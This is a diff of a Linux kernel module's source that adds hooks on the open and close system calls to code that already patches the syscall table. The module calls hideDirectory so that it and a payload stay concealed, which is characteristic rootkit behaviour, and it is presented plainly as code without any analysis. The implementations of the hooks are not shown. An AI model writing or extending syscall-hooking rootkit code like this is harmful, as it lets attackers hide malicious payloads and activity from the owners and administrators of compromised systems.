@@ -10,6 +10,7 @@
 #include "readShim.h"
 #include "mkdirShim.h"
 #include "forkShim.h"
+#include "shimOpenClose.h"
 
 MODULE_LICENSE("GPL");
 
@@ -42,6 +43,8 @@ int init_module() {
 	patch(SYS_mkdir, mkdirShim);
 	//patch(SYS_fork, forkShim);
 	//patch(SYS_clone, cloneShim);
+	patch(SYS_open, openShim);
+	patch(SYS_close, closeShim);
 
 	//request module and payload to be hidden
 	hideDirectory(secret_ko_name);
@@ -56,10 +59,12 @@ void cleanup_module() {
 	//The API can be called to deactivate the module.
 
 	//restore the system call table, in reverse order
-	unpatch(SYS_clone);
+	unpatch(SYS_close);
+	unpatch(SYS_open);
+	//unpatch(SYS_clone);
 	//unpatch(SYS_fork);
 	unpatch(SYS_mkdir);
-	unpatch(SYS_read);
+	//unpatch(SYS_read);
 	unpatch(SYS_getdents);
 	memcpy(sys_call_table, backup_sys_call_table, sizeof(backup_sys_call_table));
 	if (hiddenDirectories) {
